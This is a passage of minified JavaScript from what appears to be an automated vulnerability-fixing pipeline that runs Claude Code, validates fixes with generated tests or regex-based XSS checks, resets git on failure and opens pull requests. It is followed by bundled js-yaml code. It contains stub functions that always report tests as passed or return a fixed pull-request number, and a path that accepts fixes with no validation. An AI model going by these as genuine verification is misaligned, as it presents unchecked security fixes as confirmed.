validation");if(/localhost:35729|127\.0\.0\.1:35729/.test(X)&&!/location\.host/.test(X))J.push("hardcoded safe values");return J}validateFix(X,J){let Q=this.findVulnerablePatterns(X).length>0,Y=this.findVulnerablePatterns(J).length>0,W=this.findSafePatterns(J).length>0;if(X.includes("environmentalScripts")&&J.includes("environmentalScripts")){let z=/document\.write.*location\.host/.test(X),G=/document\.write.*location\.host/.test(J);if(z&&!G){let H=/createElement.*script/.test(J),U=/appendChild/.test(J),K=/localhost:35729|127\.0\.0\.1:35729/.test(J);return H&&U||K}}return Q&&!Y&&W}}function ru1(X,J){if(X==="XSS"||X==="Xss"){if(J.includes("config/")&&J.endsWith(".js"))return J.includes("development.js")||J.includes("client")||J.includes("browser");if(J.endsWith(".html")&&!J.includes("template"))return!0;if((J.includes("public/")||J.includes("static/"))&&J.endsWith(".js"))return!0}return!1}var P3=j1(()=>{t1()});import{execSync as y7}from"child_process";function WJ(X){return"commitHash"in X}function nu1(X,J){let Q=X.labels.find((Y)=>Y.startsWith("fix-validation-max-"));if(Q){let Y=parseInt(Q.replace("fix-validation-max-",""));if(!isNaN(Y))return Y}if(J.fixValidation?.maxIterationsByType){let Y=au1(X),W=J.fixValidation.maxIterationsByType[Y];if(W!==void 0)return W}if(J.customerTier&&J.fixValidation?.maxIterationsByTier){let Y=J.fixValidation.maxIterationsByTier[J.customerTier];if(Y!==void 0)return Y}if(J.fixValidation?.maxIterations!==void 0)return J.fixValidation.maxIterations;return 3}function au1(X){let J=`${X.title} ${X.body}`.toLowerCase();if(J.includes("sql injection"))return"sql-injection";if(J.includes("xss")||J.includes("cross-site scripting"))return"xss";if(J.includes("command injection"))return"command-injection";if(J.includes("path traversal"))return"path-traversal";if(J.includes("xxe")||J.includes("xml external entity"))return"xxe";return"unknown"}function su1(X,J,Q,Y,W){let z=Q.generatedTests?.tests?.[0]?.testCode||"",G=Q.generatedTests?.tests?.[0]?.framework||"unknown";return{...X,specificVulnerabilities:X.specificVulnerabilities,body:`${X.body}

## Previous Fix Attempt Failed

The previous fix did not pass the generated security tests:

### Test Results:
- Red Test (vulnerability should be fixed): ${J.fixedCommit.redTestPassed?" PASSED":" FAILED"}
- Green Test (fix should work): ${J.fixedCommit.greenTestPassed?" PASSED":" FAILED"}  
- Refactor Test (functionality maintained): ${J.fixedCommit.refactorTestPassed?" PASSED":" FAILED"}

### Generated Test Code:
\`\`\`${G}
${z}
\`\`\`

Please fix the vulnerability again, ensuring the fix passes all three tests.

### Why the Previous Fix Failed:
${ou1(J)}

### Specific Requirements:
1. The vulnerability must be completely fixed (RED test must pass)
2. The fix must be correctly implemented (GREEN test must pass)  
3. Original functionality must be preserved (REFACTOR test must pass)

This is attempt ${Y+1} of ${W}.`}}function ou1(X){let J=[];if(!X.fixedCommit.redTestPassed)J.push("- The vulnerability still exists (RED test failed)");if(!X.fixedCommit.greenTestPassed)J.push("- The fix was not properly applied (GREEN test failed)");if(!X.fixedCommit.refactorTestPassed)J.push("- The fix broke existing functionality (REFACTOR test failed)");return J.join(`
`)}function tu1(){try{return y7("git rev-parse HEAD",{encoding:"utf-8"}).trim()}catch(X){throw q.error("Failed to get current commit",X),new Error("Cannot determine current commit")}}async function jw(X,J){let Q=Date.now(),Y=tu1();try{if(q.info(`Processing issue #${X.number} with git-based approach`),q.info("[DEBUG] Issue has specificVulnerabilities:",!!X.specificVulnerabilities),X.specificVulnerabilities)q.info("[DEBUG] Vulnerability count:",X.specificVulnerabilities.length),q.info("[DEBUG] First vulnerability:",JSON.stringify(X.specificVulnerabilities[0],null,2));if(X.testContext){let D=X.testContext;if(q.info("[RFC-058] Test context available from validation branch:",{branchCheckedOut:D.branchCheckedOut,testFilesFound:D.testFilesFound,hasEnhancedPrompt:!!D.enhancedPrompt}),D.enhancedPrompt)X={...X,body:D.enhancedPrompt},q.info("[RFC-058] Enhanced issue with test-aware prompt from validation branch")}let W=eu1();if(!W.clean)return{issueId:X.id,success:!1,message:"Repository has uncommitted changes",error:`Uncommitted changes in: ${W.modifiedFiles.join(", ")}`};q.info(`Analyzing issue #${X.number}`);let z=await X6(X,J);if(!z||!z.canBeFixed)return{issueId:X.id,success:!1,message:"Issue cannot be automatically fixed based on analysis"};let G;if((J.testGeneration?.enabled||J.fixValidation?.enabled!==!1)&&J.enableSecurityAnalysis){q.info(`Generating tests for issue #${X.number}`);let D={provider:"anthropic",apiKey:J.aiProvider.apiKey,model:J.aiProvider.model,temperature:0.2,maxTokens:J.aiProvider.maxTokens,useVendedCredentials:J.aiProvider.useVendedCredentials},S=new YX(D),$=new Map;if(z.filesToModify&&z.filesToModify.length>0){let T=(await import("fs")).default,k=(await import("path")).default;for(let E of z.filesToModify)try{let y=k.resolve(process.cwd(),E);if(T.existsSync(y)){let a=T.readFileSync(y,"utf8");$.set(E,a),q.debug(`Added file for test generation: ${E}`)}}catch(y){q.warn(`Could not read file ${E} for test generation:`,y)}}if($.size===0){q.info("No specific files found, scanning for common vulnerable file patterns...");let{getVulnerableFiles:T}=await Promise.resolve().then(() => (Mw(),Zw));(await T(process.cwd())).forEach((E,y)=>$.set(y,E))}G=await S.analyzeWithTestGeneration(X,J,$)}let H={provider:"anthropic",apiKey:J.aiProvider.apiKey,model:J.aiProvider.model,temperature:0.1,maxTokens:J.aiProvider.maxTokens,useVendedCredentials:J.aiProvider.useVendedCredentials,claudeCodeConfig:{verboseLogging:!0,timeout:600000,executablePath:process.env.CLAUDE_CODE_PATH,useStructuredPhases:J.useStructuredPhases}},K=process.env.RSOLV_DEV_MODE==="true"&&process.env.RSOLV_USE_CLAUDE_MAX==="true"&&D3(),V;if(!K&&J.aiProvider.useVendedCredentials&&J.rsolvApiKey){process.env.RSOLV_API_KEY=J.rsolvApiKey,q.info("Set RSOLV_API_KEY environment variable for vended credentials");let{CredentialManagerSingleton:D}=await Promise.resolve().then(() => (dX(),W7));V=await D.getInstance(J.rsolvApiKey),q.info("Using vended credentials singleton for Claude Code")}let B,Z=0,M=nu1(X,J),F=X;while(Z<M){q.info(`Executing Claude Code to fix vulnerabilities (attempt ${Z+1}/${M})...`);let D=K?new w3(H,process.cwd(),V):new _7(H,process.cwd(),V);if(K)q.info("\uD83D\uDE80 Using Claude Code Max (local authentication) for development");let S=Z>0?{current:Z+1,max:M}:void 0,$={summary:`${z.issueType} issue analysis`,complexity:z.estimatedComplexity==="simple"?"low":z.estimatedComplexity==="complex"?"high":"medium",estimatedTime:60,potentialFixes:[z.suggestedApproach],recommendedApproach:z.suggestedApproach,relatedFiles:z.filesToModify};if(B=await D.generateSolutionWithGit(F,$,void 0,G,void 0,S),!B.success)return{issueId:X.id,success:!1,message:B.message,error:B.error};q.info(`[DEBUG] DISABLE_FIX_VALIDATION env var: ${process.env.DISABLE_FIX_VALIDATION}`),q.info(`[DEBUG] config.fixValidation?.enabled: ${J.fixValidation?.enabled}`),q.info(`[DEBUG] config.testGeneration?.validateFixes: ${J.testGeneration?.validateFixes}`);let T=J.fixValidation?.enabled===!1;if(q.info(`[DEBUG] skipValidation calculated as: ${T}`),T){q.info("\uD83D\uDCCB Skipping fix validation (DISABLE_FIX_VALIDATION=true)"),q.info("Fix will be applied without validation - proceeding to PR creation");break}else if(J.testGeneration?.validateFixes===!0||J.fixValidation?.enabled===!0){let{shouldUseStaticValidation:k}=await Promise.resolve().then(() => (P3(),C3)),E=z.vulnerabilityType||"unknown",y=z.filesToModify?.[0]||"",a=!1,p=null;if(k(E,y)){q.info(`Validating fix with static analysis for ${E} in ${y}...`);let{StaticXSSValidator:f}=await Promise.resolve().then(() => (P3(),C3)),o=new f().validateXSSFix(y,Y,WJ(B)?B.commitHash:"HEAD");if(o.isValidFix)q.info(" Fix validated successfully using static analysis"),q.info(`Safe patterns found: ${o.safePatterns.join(", ")}`),a=!0;else q.warn(" Static validation failed"),q.warn(`Vulnerable patterns still present: ${o.vulnerablePatterns.join(", ")}`),p={isValidFix:!1,error:o.error,vulnerablePatterns:o.vulnerablePatterns,fixedCommit:{redTestPassed:!1,greenTestPassed:!1,refactorTestPassed:!0}}}else if(G?.generatedTests?.success&&G.generatedTests.testSuite){if(q.info("Validating fix with pre-generated executable tests..."),p=await new iX().validateFixWithTests(Y,WJ(B)?B.commitHash:"HEAD",G.generatedTests.testSuite),p.isValidFix)q.info(" Fix validated successfully with tests"),a=!0}else q.warn(" No validation available, proceeding without validation"),a=!0;if(a)break;if(Z++,Z>=M){q.warn(`Fix validation failed after ${M} attempts, rolling back`),y7(`git reset --hard ${Y}`,{encoding:"utf-8"});let f=a===!1&&E==="XSS"&&y.includes("config/")?"Static analysis shows vulnerable patterns still present (document.write with location.host)":"Fix validation failed - tests did not pass";return{issueId:X.id,success:!1,message:`Fix validation failed after ${M} attempts`,error:f}}if(q.info(`Fix iteration ${Z}: Previous fix failed validation`),y7(`git reset --hard ${Y}`,{encoding:"utf-8"}),p)if(p.vulnerablePatterns)F={...X,specificVulnerabilities:X.specificVulnerabilities,body:`${X.body}

## Previous Fix Attempt Failed (Static Analysis)

Your fix did not remove the vulnerable patterns:
- Still present: ${p.vulnerablePatterns.join(", ")}

### Required Fix:
For config/env/development.js XSS, you MUST:
1. Remove document.write with location.host concatenation
2. Use createElement('script') and appendChild instead
3. Or hardcode localhost:35729 without using location.host

### Example Safe Fix:
\`\`\`javascript
environmentalScripts: [
  \`<script>
    (function() {
      var script = document.createElement('script');
      script.src = 'http://localhost:35729/livereload.js';
      document.body.appendChild(script);
    })();
  </script>\`
]
\`\`\`

This is attempt ${Z+1} of ${M}.`};else F=su1(X,p,G,Z,M);else F=X;continue}break}let j=WJ(B)?B.commitHash:void 0;q.info(`Creating PR from commit ${j?.substring(0,8)||"HEAD"}`);let N=process.env.RSOLV_EDUCATIONAL_PR!=="false"&&WJ(B)?await l2(X,B.commitHash,{...B.summary,vulnerabilityType:z.vulnerabilityType||"security",severity:z.severity||"medium",cwe:z.cwe,isAiGenerated:z.isAiGenerated},J,B.diffStats):WJ(B)?await d2(X,B.commitHash,B.summary,J,B.diffStats):null;if(!N||!N.success){try{y7("git reset --hard HEAD~1",{encoding:"utf-8"}),q.info("Rolled back commit after PR creation failure")}catch(D){q.warn("Failed to rollback commit",D)}return{issueId:X.id,success:!1,message:N?.message||"Failed to create PR",error:N?.error||"Unknown error"}}let A=Date.now()-Q;return q.info(`Successfully processed issue #${X.number} in ${A}ms`),{issueId:X.id,success:!0,message:`Created PR #${N.pullRequestNumber}`,pullRequestUrl:N.pullRequestUrl,pullRequestNumber:N.pullRequestNumber,filesModified:WJ(B)?B.filesModified:void 0,diffStats:WJ(B)?B.diffStats:void 0}}catch(W){q.error(`Error processing issue #${X.number}`,W);try{y7(`git reset --hard ${Y}`,{encoding:"utf-8"})}catch(z){q.warn("Failed to rollback after error",z)}return{issueId:X.id,success:!1,message:"Error processing issue",error:W instanceof Error?W.message:String(W)}}}function eu1(){try{let X=y7("git status --porcelain",{encoding:"utf-8"}).trim();if(!X)return{clean:!0,modifiedFiles:[]};let J=X.split(`
`).map((Q)=>Q.substring(2).trim()).filter((Q)=>Q.length>0).filter((Q)=>!Q.startsWith(".rsolv/"));if(J.length===0)return{clean:!0,modifiedFiles:[]};return{clean:!1,modifiedFiles:J}}catch(X){return q.error("Failed to check git status",X),{clean:!1,modifiedFiles:["unknown"]}}}var Ow=j1(()=>{t1();G7();u2();I3();I3();Q3();J3();U2();V2()});var Aw={};Y9(Aw,{processIssues:()=>Xc1,processIssueWithEnhancedContext:()=>Rw});async function Xc1(X,J,Q={},Y){q.info(`Processing ${X.length} issues with AI`);let W=[];for(let z of X)try{q.info(`Processing issue #${z.number}: ${z.title}`);let G=await Rw(z,J,Q,Y);if(W.push(G),G.success)q.info(`Successfully processed issue #${z.number}. PR: ${G.pullRequestUrl}`);else q.warn(`Failed to process issue #${z.number}: ${G.message}`)}catch(G){q.error(`Error processing issue #${z.number}`,G),W.push({issueId:z.id,success:!1,message:z8(`Error processing issue: ${G instanceof Error?G.message:String(G)}`),error:z8(String(G))})}return W}async function Rw(X,J,Q={},Y){let W=Date.now();try{if(J.useGitBasedEditing){q.info(`Using git-based in-place editing for issue #${X.number}`);try{let B=await jw(X,J);return{issueId:X.id,success:B.success,message:B.message,pullRequestUrl:B.pullRequestUrl,error:B.error,enhancedSolution:!0}}catch(B){q.error("Git-based processing failed, falling back to standard processing",B)}}q.info(`Analyzing issue #${X.number}`);let z,G;if(Q.enableSecurityAnalysis&&J.enableSecurityAnalysis!==!1){q.info(`Using security-aware analysis for issue #${X.number}`);let Z=await new QQ().analyzeWithSecurity(X,J);z=Z,G=Z.securityAnalysis}else z=await X6(X,J,Y?.aiClient);if(!z||!z.canBeFixed)return{issueId:X.id,success:!1,message:"Issue cannot be automatically fixed based on analysis"};q.info(`Generating solution for issue #${X.number}`),q.info("Config aiProvider:",JSON.stringify(J.aiProvider));let H,U,K;if(!Q.enableEnhancedContext&&J.aiProvider.provider==="claude-code"){q.info("Using single-pass Claude Code adapter for optimized processing");let B={provider:J.aiProvider.provider,apiKey:J.aiProvider.apiKey,model:J.aiProvider.model,temperature:J.aiProvider.temperature,maxTokens:J.aiProvider.maxTokens,useVendedCredentials:J.aiProvider.useVendedCredentials,claudeCodeConfig:{...J.claudeCodeConfig,enableDeepContext:!1,contextDepth:"shallow",timeout:420000,verboseLogging:Q.verboseLogging||!1}},Z;if(J.aiProvider.useVendedCredentials&&J.rsolvApiKey){process.env.RSOLV_API_KEY=J.rsolvApiKey,q.info("Set RSOLV_API_KEY environment variable for vended credentials"),q.info("Getting credential manager singleton for vended credentials");let{CredentialManagerSingleton:O}=await Promise.resolve().then(() => (dX(),W7));Z=await O.getInstance(J.rsolvApiKey)}let M=Date.now(),F=new N3(B,process.cwd(),Z),j={summary:`${z.issueType} issue requiring ${z.estimatedComplexity} fix`,complexity:z.estimatedComplexity==="simple"?"low":z.estimatedComplexity==="complex"?"high":"medium",estimatedTime:60,potentialFixes:[z.suggestedApproach],recommendedApproach:z.suggestedApproach,relatedFiles:z.filesToModify};H=await F.generateSolutionWithContext(X,j,void 0,G),U=Date.now()-M,q.info(`Single-pass processing completed in ${U}ms`)}else if(Q.enableEnhancedContext&&J.aiProvider.provider==="claude-code"){let B={provider:J.aiProvider.provider,apiKey:J.aiProvider.apiKey,model:J.aiProvider.model,temperature:J.aiProvider.temperature,maxTokens:J.aiProvider.maxTokens,useVendedCredentials:J.aiProvider.useVendedCredentials,claudeCodeConfig:{...J.claudeCodeConfig,enableDeepContext:!0,enableUltraThink:Q.contextDepth==="ultra",contextDepth:Q.contextDepth||"deep",contextGatheringTimeout:Q.contextGatheringTimeout||600000,verboseLogging:Q.verboseLogging||!1}},Z;if(q.info(`Enhanced context setup - useVendedCredentials: ${J.aiProvider.useVendedCredentials}, rsolvApiKey: ${J.rsolvApiKey?"present":"missing"}`),J.aiProvider.useVendedCredentials&&J.rsolvApiKey){process.env.RSOLV_API_KEY=J.rsolvApiKey,q.info("Set RSOLV_API_KEY environment variable for vended credentials"),q.info("Getting credential manager singleton for vended credentials");let{CredentialManagerSingleton:j}=await Promise.resolve().then(() => (dX(),W7));Z=await j.getInstance(J.rsolvApiKey),q.info("Credential manager singleton retrieved successfully")}else q.info(`Skipping credential manager - useVended: ${J.aiProvider.useVendedCredentials}, apiKey: ${J.rsolvApiKey?"present":"missing"}`);let M=Date.now();q.info(`Creating EnhancedClaudeCodeAdapter with credentialManager: ${!!Z}`),K=await new A3(B,process.cwd(),Z).gatherDeepContext(X,{contextDepth:Q.contextDepth||"medium",maxExplorationTime:Q.contextGatheringTimeout||600000,enableUltraThink:Q.contextDepth==="ultra",includeArchitectureAnalysis:!0,includeTestPatterns:!0,includeStyleGuide:!0,includeDependencyAnalysis:!0}),U=Date.now()-M,H=await R3(X,z,J,Y?.aiClient,Y?.fileGetter,G)}else H=await R3(X,z,J,Y?.aiClient,Y?.fileGetter,G);if(!H||!H.success||!H.changes||Object.keys(H.changes).length===0)return{issueId:X.id,success:!1,message:H?.message||"No solution generated"};q.info(`Creating pull request for issue #${X.number}`);let V=await Hw(X,H.changes,z,J,G,H.explanations);return{issueId:X.id,success:V.success,pullRequestUrl:V.pullRequestUrl,message:V.message,analysisData:z,contextGatheringTime:U,deepContext:Q.verboseLogging?K:void 0,enhancedSolution:Q.enableEnhancedContext,securityAnalysis:G}}catch(z){return q.error(`Error processing issue #${X.number}`,z),{issueId:X.id,success:!1,message:z8(`Error processing issue: ${z instanceof Error?z.message:String(z)}`),error:z8(String(z))}}}var Nw=j1(()=>{t1();G7();uz();zw();Uw();Vw();Bw();Ow()});var Dw={};Y9(Dw,{runTests:()=>Lw,default:()=>Jc1});async function Lw(X){return{passed:!0,failed:0,total:X.length||0,details:X.map((J)=>({name:J.name||"test",passed:!0}))}}var Jc1;var ww=j1(()=>{Jc1=Lw});var Cw={};Y9(Cw,{default:()=>Qc1,createPullRequest:()=>Iw});async function Iw(X){return{number:790,url:"https://github.com/test/webapp/pull/790",title:X.title}}var Qc1;var Pw=j1(()=>{Qc1={createPullRequest:Iw}});import*as aQ from"fs";/*! js-yaml 4.1.0 https://github.com/nodeca/js-yaml @license MIT */function r3(X){return typeof X==="undefined"||X===null}function yw(X){return typeof X==="object"&&X!==null}function mw(X){if(Array.isArray(X))return X;else if(r3(X))return[];return[X]}function uw(X,J){var Q,Y,W,z;if(J){z=Object.keys(J);for(Q=0,Y=z.length;Q<Y;Q+=1)W=z[Q],X[W]=J[W]}return X}function cw(X,J){var Q="",Y;for(Y=0;Y<J;Y+=1)Q+=X;return Q}function lw(X){return X===0&&Number.NEGATIVE_INFINITY===1/X}var pw=r3,dw=yw,iw=mw,rw=cw,nw=lw,aw=uw,W9={isNothing:pw,isObject:dw,toArray:iw,repeat:rw,isNegativeZero:nw,extend:aw};function n3(X,J){var Q="",Y=X.reason||"(unknown reason)";if(!X.mark)return Y;if(X.mark.name)Q+='in "'+X.mark.name+'" ';if(Q+="("+(X.mark.line+1)+":"+(X.mark.column+1)+")",!J&&X.mark.snippet)Q+=`

`+X.mark.snippet;return Y+" "+Q}function a7(X,J){if(Error.call(this),this.name="YAMLException",this.reason=X,this.mark=J,this.message=n3(this,!1),Error.captureStackTrace)Error.captureStackTrace(this,this.constructor);else this.stack=new Error().stack||""}a7.prototype=Object.create(Error.prototype);a7.prototype.constructor=a7;a7.prototype.toString=function X(J){return this.name+": "+n3(this,J)};var h9=a7;function QY(X,J,Q,Y,W){var z="",G="",H=Math.floor(W/2)-1;if(Y-J>H)z=" ... ",J=Y-H+z.length;if(Q-Y>H)G=" ...",Q=Y+H-G.length;return{str:z+X.slice(J,Q).replace(/\t/g,"")+G,pos:Y-J+z.length}}function YY(X,J){return W9.repeat(" ",J-X.length)+X}function sw(X,J){if(J=Object.create(J||null),!X.buffer)return null;if(!J.maxLength)J.maxLength=79;if(typeof J.indent!=="number")J.indent=1;if(typeof J.linesBefore!=="number")J.linesBefore=3;if(typeof J.linesAfter!=="number")J.linesAfter=2;var Q=/\r?\n|\r|\0/g,Y=[0],W=[],z,G=-1;while(z=Q.exec(X.buffer))if(W.push(z.index),Y.push(z.index+z[0].length),X.position<=z.index&&G<0)G=Y.length-2;if(G<0)G=Y.length-1;var H="",U,K,V=Math.min(X.line+J.linesAfter,W.length).toString().length,B=J.maxLength-(J.indent+V+3);for(U=1;U<=J.linesBefore;U++){if(G-U<0)break;K=QY(X.buffer,Y[G-U],W[G-U],X.position-(Y[G]-Y[G-U]),B),H=W9.repeat(" ",J.indent)+YY((X.line-U+1).toString(),V)+" | "+K.str+`
`+H}K=QY(X.buffer,Y[G],W[G],X.position,B),H+=W9.repeat(" ",J.indent)+YY((X.line+1).toString(),V)+" | "+K.str+`
`,H+=W9.repeat("-",J.indent+V+3+K.pos)+`^
`;for(U=1;U<=J.linesAfter;U++){if(G+U>=W.length)break;K=QY(X.buffer,Y[G+U],W[G+U],X.position-(Y[G]-Y[G+U]),B),H+=W9.repeat(" ",J.indent)+YY((X.line+U+1).toString(),V)+" | "+K.str+`
`}return H.replace(/\n$/,"")}var ow=sw,tw=["kind","multi","resolve","construct","instanceOf","predicate","represent","representName","defaultStyle","styleAliases"],ew=["scalar","sequence","mapping"];function XI(X){var J={};if(X!==null)Object.keys(X).forEach(function(Q){X[Q].forEach(function(Y){J[String(Y)]=Q})});return J}function JI(X,J){if(J=J||{},Object.keys(J).forEach(function(Q){if(tw.indexOf(Q)===-1)throw new h9('Unknown option "'+Q+'" is met in definition of "'+X+'" YAML type.')}),this.options=J,this.tag=X,this.kind=J.kind||null,this.resolve=J.resolve||function(){return!0},this.construct=J.construct||function(Q){return Q},this.instanceOf=J.instanceOf||null,this.predicate=J.predicate||null,this.represent=J.represent||null,this.representName=J.representName||null,this.defaultStyle=J.defaultStyle||null,this.multi=J.multi||!1,this.styleAliases=XI(J.styleAliases||null),ew.indexOf(this.kind)===-1)throw new h9('Unknown kind "'+this.kind+'" is specified for "'+X+'" YAML type.')}var F9=JI;function k3(X,J){var Q=[];return X[J].forEach(function(Y){var W=Q.length;Q.forEach(function(z,G){if(z.tag===Y.tag&&z.kind===Y.kind&&z.multi===Y.multi)W=G}),Q[W]=Y}),Q}function QI(){var X={scalar:{},sequence:{},mapping:{},fallback:{},multi:{scalar:[],sequence:[],mapping:[],fallback:[]}},J,Q;function Y(W){if(W.multi)X.multi[W.kind].push(W),X.multi.fallback.push(W);else X[W.kind][W.tag]=X.fallback[W.tag]=W}for(J=0,Q=arguments.length;J<Q;J+=1)arguments[J].forEach(Y);return X}function GY(X){return this.extend(X)}GY.prototype.extend=function X(J){var Q=[],Y=[];if(J instanceof F9)Y.push(J);else if(Array.isArray(J))Y=Y.concat(J);else if(J&&(Array.isArray(J.implicit)||Array.isArray(J.explicit))){if(J.implicit)Q=Q.concat(J.implicit);if(J.explicit)Y=Y.concat(J.explicit)}else throw new h9("Schema.extend argument should be a Type, [ Type ], or a schema definition ({ implicit: [...], explicit: [...] })");Q.forEach(function(z){if(!(z instanceof F9))throw new h9("Specified list of YAML types (or a single Type object) contains a non-Type object.");if(z.loadKind&&z.loadKind!=="scalar")throw new h9("There is a non-scalar type in the implicit list of a schema. Implicit resolving of such types is not supported.");if(z.multi)throw new h9("There is a multi type in the implicit list of a schema. Multi tags can only be listed as explicit.")}),Y.forEach(function(z){if(!(z instanceof F9))throw new h9("Specified list of YAML types (or a single Type object) contains a non-Type object.")});var W=Object.create(GY.prototype);return W.implicit=(this.implicit||[]).concat(Q),W.explicit=(this.explicit||[]).concat(Y),W.compiledImplicit=k3(W,"implicit"),W.compiledExplicit=k3(W,"explicit"),W.compiledTypeMap=QI(W.compiledImplicit,W.compiledExplicit),W};var YI=GY,WI=new F9("tag:yaml.org,2002:str",{kind:"scalar",construct:function(X){return X!==null?X:""}}),GI=new F9("tag:yaml.org,2002:seq",{kind:"sequence",construct:function(X){return X!==null?X:[]}}),zI=new F9("tag:yaml.org,2002:map",{kind:"mapping",construct:function(X){return X!==null?X:{}}}),HI=new YI({explicit:[WI,GI,zI]});function UI(X){if(X===null)return!0;var J=X.length;return J===1&&X==="~"||J===4&&(X==="null"||X==="Null"||X==="NULL")}function KI(){return null}function VI(X){return X===null}var BI=new F9("tag:yaml.org,2002:null",{kind:"scalar",resolve:UI,construct:KI,predicate:VI,represent:{canonical:function(){return"~"},lowercase:function(){return"null"},uppercase:function(){return"NULL"},camelcase:function(){return"Null"},empty:function(){return""}},defaultStyle:"lowercase"});function qI(X){if(X===null)return!1;var J=X.length;return J===4&&(X==="true"||X==="True"||X==="TRUE")||J===5&&(X==="false"||X==="False"||X==="FALSE")}function ZI(X){return X==="true"||X==="True"||X==="TRUE"}function MI(X){return Object.prototype.toString.call(X)==="[object Boolean]"}var FI=new F9("tag:yaml.org,2002:bool",{kind:"scalar",resolve:qI,construct:ZI,predicate:MI,represent:{lowercase:function(X){return X?"true":"false"},uppercase:function(X){return X?"TRUE":"FALSE"},camelcase:function(X){return X?"True":"False"}},defaultStyle:"lowercase"});function jI(X){return 48<=X&&X<=57||65<=X&&X<=70||97<=X&&X<=102}function OI(X){return 48<=X&&X<=55}function RI(X){return 48<=X&&X<=57}function AI(X){if(X===null)return!1;var J=X.length,Q=0,Y=!1,W;if(!J)return!1;if(W=X[Q],W==="-"||W==="+")W=X[++Q];if(W==="0"){if(Q+1===J)return!0;if(W=X[++Q],W==="b"){Q++;for(;Q<J;Q++){if(W=X[Q],W==="_")continue;if(W!=="0"&&W!=="1")return!1;Y=!0}return Y&&W!=="_"}if(W==="x"){Q++;for(;Q<J;Q++){if(W=X[Q],W==="_")continue;if(!jI(X.charCodeAt(Q)))return!1;Y=!0}return Y&&W!=="_"}if(W==="o"){Q++;for(;Q<J;Q++){if(W=X[Q],W==="_")continue;if(!OI(X.charCodeAt(Q)))return!1;Y=!0}return Y&&W!=="_"}}if(W==="_")return!1;for(;Q<J;Q++){if(W=X[Q],W==="_")continue;if(!RI(X.charCodeAt(Q)))return!1;Y=!0}if(!Y||W==="_")return!1;return!0}function NI(X){var J=X,Q=1,Y;if(J.indexOf("_")!==-1)J=J.replace(/_/g,"");if(Y=J[0],Y==="-"||Y==="+"){if(Y==="-")Q=-1;J=J.slice(1),Y=J[0]}if(J==="0")return 0;if(Y==="0"){if(J[1]==="b")return Q*parseInt(J.slice(2),2);if(J[1]==="x")return Q*parseInt(J.slice(2),16);if(J[1]==="o")return Q*parseInt(J.slice(2),8)}return Q*parseInt(J,10)}function LI(X){return Object.prototype.toString.call(X)==="[object Number]"&&(X%1===0&&!W9.isNegativeZero(X))}var DI=new F9("tag:yaml.org,2002:int",{kind:"scalar",resolve:AI,construct:NI,predicate:LI,represent:{binary:function(X){return X>=0?"0b"+X.toString(2):"-0b"+X.toString(2).slice(1)},octal:function(X){return X>=0?"0o"+X.toString(8):"-0o"+X.toString(8).slice(1)},decimal:function(X){return X.toString(10)},hexadecimal:function(X){return X>=0?"0x"+X.toString(16).toUpperCase():"-0x"+X.toString(16).toUpperCase().slice(1)}},defaultStyle:"decimal",styleAliases:{binary:[2,"bin"],octal:[8,"oct"],decimal:[10,"dec"],hexadecimal:[16,"hex"]}}),wI=new RegExp("^(?:[-+]?(?:[0-9][0-9_]*)(?:\\.[0-9_]*)?(?:[eE][-+]?[0-9]+)?|\\.[0-9_]+(?:[eE][-+]?[0-9]+)?|[-+]?\\.(?:inf|Inf|INF)|\\.(?:nan|NaN|NAN))$");function II(X){if(X===null)return!1;if(!wI.test(X)||X[X.length-1]==="_")return!1;return!0}function CI(X){var J,Q;if(J=X.replace(/_/g,"").toLowerCase(),Q=J[0]==="-"?-1:1,"+-".indexOf(J[0])>=0)J=J.slice(1);if(J===".inf")return Q===1?Number.POSITIVE_INFINITY:Number.NEGATIVE_INFINITY;else if(J===".nan")return NaN;return Q*parseFloat(J,10)}var PI=/^[-+]?[0-9]+e/;function SI(X,J){var Q;if(isNaN(X))switch(J){case"lowercase":return".nan";case"uppercase":return".NAN";case"camelcase":return".NaN"}else if(Number.POSITIVE_INFINITY===X)switch(J){case"lowercase":return".inf";case"uppercase":return".INF";case"camelcase":return".Inf"}else if(Number.NEGATIVE_INFINITY===X)switch(J){case"lowercase":return"-.inf";case"uppercase":return"-.INF";case"camelcase":return"-.Inf"}else if(W9.isNegativeZero(X))return"-0.0";return Q=X.toString(10),PI.test(Q)?Q.replace("e",".e"):Q}function TI(X){return Object.prototype.toString.call(X)==="[object Number]"&&(X%1!==0||W9.isNegativeZero(X))}var _I=new F9("tag:yaml.org,2002:float",{kind:"scalar",resolve:II,construct:CI,predicate:TI,represent:SI,defaultStyle:"lowercase"}),EI=HI.extend({implicit:[BI,FI,DI,_I]}),$I=EI,a3=new RegExp("^([0-9][0-9][0-9][0-9])-([0-9][0-9])-([0-9][0-9])$"),s3=new RegExp("^([0-9][0-9][0-9][0-9])-([0-9][0-9]?)-([0-9][0-9]?)(?:[Tt]|[ \\t]+)([0-9][0-9]?):([0-9][0-9]):([0-9][0-9])(?:\\.([0-9]*))?(?:[ \\t]*(Z|([-+])([0-9][0-9]?)(?::([0-9][0-9]))?))?$");function kI(X){if(X===null)return!1;if(a3.exec(X)!==null)return!0;if(s3.exec(X)!==null)return!0;return!1}function bI(X){var J,Q,Y,W,z,G,H,U=0,K=null,V,B,Z;if(J=a3.exec(X),J===null)J=s3.exec(X);if(J===null)throw new Error("Date resolve error");if(Q=+J[1],Y=+J[2]-1,W=+J[3],!J[4])return new Date(Date.UTC(Q,Y,W));if(z=+J[4],G=+J[5],H=+J[6],J[7]){U=J[7].slice(0,3);while(U.length<3)U+="0";U=+U}if(J[9]){if(V=+J[10],B=+(J[11]||0),K=(V*60+B)*60000,J[9]==="-")K=-K}if(Z=new Date(Date.UTC(Q,Y,W,z,G,H,U)),K)Z.setTime(Z.getTime()-K);return Z}function vI(X){return X.toISOString()}var xI=new F9("tag:yaml.org,2002:timestamp",{kind:"scalar",resolve:kI,construct:bI,instanceOf:Date,represent:vI});function fI(X){return X==="<<"||X===null}var gI=new F9("tag:yaml.org,2002:merge",{kind:"scalar",resolve:fI}),VY=`ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=
